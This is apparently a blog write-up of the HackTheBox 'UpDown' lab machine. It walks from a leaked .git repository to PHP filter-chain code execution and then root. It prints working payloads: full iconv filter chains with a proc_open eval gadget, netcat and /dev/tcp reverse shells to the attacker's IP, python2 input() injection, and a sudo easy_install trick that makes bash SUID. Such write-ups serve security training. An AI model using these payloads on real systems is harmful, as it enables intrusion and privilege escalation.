@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/updown.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] UpDown - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-medium">medium</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>UpDown</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">UpDown</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">exposed /dev/.git source leak (git-dumper)</span>
+                    <span class="tag">.htaccess header-gated vhost (special-dev: only4dev)</span>
+                    <span class="tag">php filter chain lfi to rce (synacktiv)</span>
+                    <span class="tag">disable_functions bypass via proc_open</span>
+                    <span class="tag">python2 input() code injection in suid binary</span>
+                    <span class="tag">sudo easy_install setup.py (gtfobins)</span>
+                </div>
+
+                <img src="../../images/hackthebox/updown/index.png" alt="UpDown Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Only two ports are open: SSH on 22 and Apache on 80. The site advertises itself in the footer as <strong>siteisup.htb</strong>, so that name goes into <code>/etc/hosts</code>.</p>
+
+                <pre><code>[updown] nmap -Pn -v -T5 --min-rate 2000 -oN nmap -sSVC -p- 10.129.80.186
+Nmap scan report for 10.129.80.186
+Host is up (0.15s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Is my Website up ?
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <pre><code>[updown] curl -s http://10.129.80.186 | grep htb
+        &lt;p class="copyright"&gt;siteisup.htb&lt;/p&gt;
+
+[updown] echo '10.129.80.186 siteisup.htb' | sudo tee -a /etc/hosts</code></pre>
+
+                <p>The site is <strong>"Is my Website up ?"</strong>, a form that takes a single URL and reports whether it is up, with an optional <strong>debug mode</strong> checkbox that echoes the full HTTP response back. That is a full-read SSRF: pointing it at my own HTTP listener returns my directory listing verbatim, confirming the server fetches and renders whatever I give it. The <code>file://</code>, <code>data://</code> and <code>ftp://</code> schemes are filtered (<em>"Hacking attempt was detected !"</em>), so it is useful for enumeration but not an obvious file read.</p>
+
+                <pre><code>[updown] curl -s http://siteisup.htb/ -d 'site=http://10.10.14.241:8000&amp;debug=1'
+...
+&lt;textarea&gt;HTTP/1.0 200 OK
+Server: SimpleHTTP/0.6 Python/3.12.3
+...
+&lt;li&gt;&lt;a href="nmap"&gt;nmap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="notes"&gt;notes&lt;/a&gt;&lt;/li&gt;
+...</code></pre>
+
+                <p>Virtual-host fuzzing finds a second name, <strong>dev.siteisup.htb</strong>, which answers <code>403 Forbidden</code>:</p>
+
+                <pre><code>[updown] ffuf -u http://siteisup.htb -H 'Host: FUZZ.siteisup.htb' -mc all \
+  -w /usr/share/wordlists/SecLists/Discovery/DNS/shubs-subdomains.txt -fw 186
+dev                     [Status: 403, Size: 281, Words: 20, Lines: 10]</code></pre>
+
+                <p>Content fuzzing of the main host turns up a <code>/dev/</code> directory, and inside it the whole <strong>.git</strong> repository is served:</p>
+
+                <pre><code>[updown] ffuf -u http://siteisup.htb/dev/FUZZ -mc all -t 100 \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt -fw 23,20
+.git/HEAD               [Status: 200, Size: 21]
+.git/index              [Status: 200, Size: 521]
+.git/logs/HEAD          [Status: 200, Size: 179]
+.git/                   [Status: 200, Size: 2884]</code></pre>
+
+                <p>With the loose objects and packs exposed, <a href="https://github.com/arthaud/git-dumper">git-dumper</a> reconstructs the source of the dev application:</p>
+
+                <pre><code>[updown] python3 git_dumper.py http://siteisup.htb/dev/ dev_repository
+[-] Fetching .git recursively
+...
+[-] Running git checkout .
+Updated 6 paths from the index</code></pre>
+
+                <h2>Reading the dev source</h2>
+
+                <p>Two files decide everything. The <code>.htaccess</code> explains the <code>403</code>: the dev vhost is gated behind a custom request header, and only requests carrying <code>Special-Dev: only4dev</code> are allowed through.</p>
+
+                <pre><code>[updown] cat dev_repository/.htaccess
+SetEnvIfNoCase Special-Dev "only4dev" Required-Header
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header</code></pre>
+
+                <p>And <code>index.php</code> is a textbook local file include: it takes the <code>page</code> parameter, appends <code>.php</code>, and <code>include()</code>s it. There is a blocklist, but it only forbids the strings <code>bin</code>, <code>usr</code>, <code>home</code>, <code>var</code> and <code>etc</code>, which blocks the obvious <code>/etc/passwd</code> style reads but does nothing against PHP wrappers.</p>
+
+                <pre><code>&lt;?php
+    define("DIRECTACCESS",false);
+    $page=$_GET['page'];
+    if($page &amp;&amp; !preg_match("/bin|usr|home|var|etc/i",$page)){
+        include($_GET['page'] . ".php");
+    }else{
+        include("checker.php");
+    }
+?&gt;</code></pre>
+
+                <p>The sibling <code>checker.php</code> (the "beta" multi-site uploader) has a file-upload path, but its extension blocklist covers <code>php</code>, <code>phtml</code>, <code>py</code>, <code>html</code> and the archive formats, so it is a dead end. The include is the real primitive: an <code>include()</code> on a user-controlled path with no scheme filtering is a classic <strong>PHP filter chain</strong> target.</p>
+
+                <h2>Exploitation</h2>
+
+                <h3>Filter chain to a code-execution primitive</h3>
+
+                <p>Because <code>include()</code> will execute PHP that it reads through <code>php://filter</code>, I can use <a href="https://github.com/synacktiv/php_filter_chain_generator">Synacktiv's generator</a> to build an <code>iconv</code> chain that materialises arbitrary PHP bytes in memory and have <code>include()</code> run them. First I materialise <code>&lt;?php phpinfo();?&gt;</code> to read the environment. The request must carry the <code>Special-Dev</code> header, and the appended <code>.php</code> lands harmlessly on <code>resource=php://temp</code> (matched by prefix).</p>
+
+                <pre><code>[updown] python3 php_filter_chain_generator.py --chain '&lt;?php phpinfo();?&gt;'
+
+GET /?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp HTTP/1.1
+Host: dev.siteisup.htb
+Special-Dev: only4dev</code></pre>
+
+                <p>The <code>phpinfo()</code> output confirms PHP 8.0.20, that <code>HTTP_SPECIAL_DEV = only4dev</code>, and most importantly the <code>disable_functions</code> list. It is long but incomplete:</p>
+
+                <pre><code>disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen</code></pre>
+
+                <p>Every obvious command sink is disabled, but <strong><code>proc_open</code> is not on the list</strong>, and <code>eval()</code> is a language construct that cannot be disabled at all. That combination is enough.</p>
+
+                <h3>proc_open through eval for RCE</h3>
+
+                <p>I regenerate the chain, this time materialising <code>&lt;?php eval($_GET[1]);?&gt;</code>, and split the attack across three parameters:</p>
+
+                <ul>
+                    <li><code>page=</code> the filter chain that produces the <code>eval($_GET[1])</code> gadget, giving an eval primitive.</li>
+                    <li><code>1=</code> the PHP to eval: <code>$p=proc_open($_GET[2],[1=&gt;["pipe","w"],2=&gt;["pipe","w"]],$pi);echo stream_get_contents($pi[1]);</code> (URL-encoded), which runs <code>$_GET[2]</code> via <code>proc_open</code> and prints stdout.</li>
+                    <li><code>2=</code> the actual shell command.</li>
+                </ul>
+
+                <pre><code>[updown] python3 php_filter_chain_generator.py --chain '&lt;?php eval($_GET[1]);?&gt;'
+[+] The following gadget chain will generate the following code : &lt;?php eval($_GET[1]);?&gt; (base64 value: PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4)
+
+GET /?page=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;1=%24p%3Dproc_open%28%24_GET%5B2%5D%2C%5B1%3D%3E%5B%22pipe%22%2C%22w%22%5D%2C2%3D%3E%5B%22pipe%22%2C%22w%22%5D%5D%2C%24pi%29%3Becho%20stream_get_contents%28%24pi%5B1%5D%29%3B&amp;2=id HTTP/1.1
+Host: dev.siteisup.htb
+Special-Dev: only4dev
+
+HTTP/1.1 200 OK
+Date: Fri, 09 Oct 2026 14:55:48 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 304
+Content-Type: text/html; charset=UTF-8
+
+&lt;b&gt;This is only for developers&lt;/b&gt;
+&lt;br&gt;
+&lt;a href="?page=admin"&gt;Admin Panel&lt;/a&gt;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <p>That is remote code execution as <code>www-data</code>. Swapping <code>2=</code> for a <code>busybox nc</code> one-liner (one of the few callout tools left after <code>fsockopen</code> and friends are disabled) returns a shell:</p>
+
+                <pre><code>&amp;2=busybox+nc+10.10.14.241+35337+-e+sh
+
+[updown] nc -lnvp 35337
+Connection received on 10.129.80.186 46914
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <h3>www-data to developer: a SUID binary and python2 input()</h3>
+
+                <p><code>pspy</code> shows only an uninteresting root cron that wipes the uploads directory as <code>www-data</code>, so I look at SUID binaries. One is clearly custom:</p>
+
+                <pre><code>www-data@updown:/tmp$ find / -perm /4000 2&gt;/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/chsh
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/mount
+/home/developer/dev/siteisup
+
+www-data@updown:/tmp$ strings /home/developer/dev/siteisup
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+puts
+setresgid
+setresuid
+system
+getegid
+geteuid
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+Welcome to 'siteisup.htb' application
+/usr/bin/python /home/developer/dev/siteisup_test.py</code></pre>
+
+                <p>The symbol table is the whole story. <code>setresuid</code> and <code>setresgid</code> next to <code>system</code> mean the binary deliberately sets its real/effective IDs to the file owner before shelling out, so it is a SUID wrapper that runs a command <strong>as <code>developer</code></strong>, not as the caller. The binary is SUID and group-executable by <code>www-data</code> (<code>-rwsr-x--- developer www-data</code>), which is exactly why <code>www-data</code> is allowed to invoke it. The only string that looks like a command is the Python call, and <code>strings</code> leaks both the interpreter (<strong>python2</strong>) and the script path. That script is group-readable by <code>www-data</code>, and the whole thing is four lines of logic:</p>
+
+                <pre><code>www-data@updown:/tmp$ ls -la /home/developer/dev/siteisup_test.py
+-rwxr-x--- 1 developer www-data 154 Jun 22  2022 /home/developer/dev/siteisup_test.py
+
+www-data@updown:/tmp$ cat /home/developer/dev/siteisup_test.py
+import requests
+
+url = input("Enter URL here:")
+page = requests.get(url)
+if page.status_code == 200:
+	print "Website is up"
+else:
+	print "Website is down"</code></pre>
+
+                <p>In python2, <code>input()</code> is equivalent to <code>eval(raw_input())</code>, so whatever I type is evaluated as Python. Since <code>siteisup</code> runs the script with <code>developer</code>'s privileges, that is code execution as <code>developer</code>:</p>
+
+                <pre><code>www-data@updown:/tmp$ /home/developer/dev/siteisup
+Welcome to 'siteisup.htb' application
+
+Enter URL here:__import__('os').system('id')
+uid=1002(developer) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <p>I feed it a reverse shell, catch it as <code>developer</code>, then drop my public key into <code>~/.ssh/authorized_keys</code> for a stable SSH session and the user flag:</p>
+
+                <pre><code>Enter URL here:__import__('os').system('/bin/bash -c "sh -i >&amp; /dev/tcp/10.10.14.241/4444 0>&amp;1"')
+
+[updown] nc -lnvp 4444
+Connection received on 10.129.80.186 37668
+$ id
+uid=1002(developer) gid=33(www-data) groups=33(www-data)
+
+developer@updown:~$ cat user.txt</code></pre>
+
+                <h3>developer to root: sudo easy_install</h3>
+
+                <p><code>developer</code> may run <code>easy_install</code> as root with no password:</p>
+
+                <pre><code>developer@updown:~$ sudo -l
+User developer may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install</code></pre>
+
+                <p><a href="https://gtfobins.github.io/gtfobins/easy_install/">GTFOBins</a> covers this exactly: <code>easy_install</code> executes the <code>setup.py</code> of whatever package it processes. I drop a <code>setup.py</code> that makes <code>bash</code> SUID, then run it as root:</p>
+
+                <pre><code>developer@updown:~$ echo 'import os; os.system("chmod u+s /bin/bash")' > setup.py
+developer@updown:~$ sudo easy_install .
+Processing .
+Running setup.py -q bdist_egg --dist-dir /home/developer/egg-dist-tmp-BIXOoG
+
+developer@updown:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash</code></pre>
+
+                <p>With the SUID bit set, <code>bash -p</code> keeps the root euid and reads <code>/root/root.txt</code>.</p>
+
+                <pre><code>developer@updown:~$ bash -p
+bash-5.0# id
+uid=1002(developer) gid=1002(developer) euid=0(root) groups=1002(developer)</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // UpDown</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
